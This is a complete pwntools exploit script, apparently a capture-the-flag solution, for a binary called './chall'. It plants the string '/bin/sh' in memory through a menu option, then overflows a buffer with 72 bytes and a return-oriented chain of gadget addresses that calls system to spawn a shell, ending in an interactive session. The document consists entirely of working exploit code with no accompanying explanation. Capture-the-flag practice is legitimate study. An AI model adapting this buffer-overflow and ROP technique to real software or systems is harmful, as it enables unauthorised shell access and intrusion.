from pwn import *

exe = './chall'
p = process(exe)
#p = remote("127.0.0.1",1333)
#context.log_level = 'debug'

system = p64(0x0000000000401040)
binsh = p64(0x404060)
pop_rax = p64(0x000000000040119a) # pop rax ; pop r12 ; ret
mov_rdi = p64(0x00000000004011a5) # mov rdi, rax ; ret
ret = p64(0x000000000040101a)

p.sendlineafter(b'Choose an option: ',b'3')
p.send(b'/bin/sh\0')

payload = b'A'*72
payload += pop_rax + binsh + p64(0) + mov_rdi + ret + system

p.sendlineafter(b'Choose an option: ',b'1')
p.recvuntil(b'We\'ve been trying to reach you about your cars extended warranty\n')
p.sendline(payload)

p.interactive()
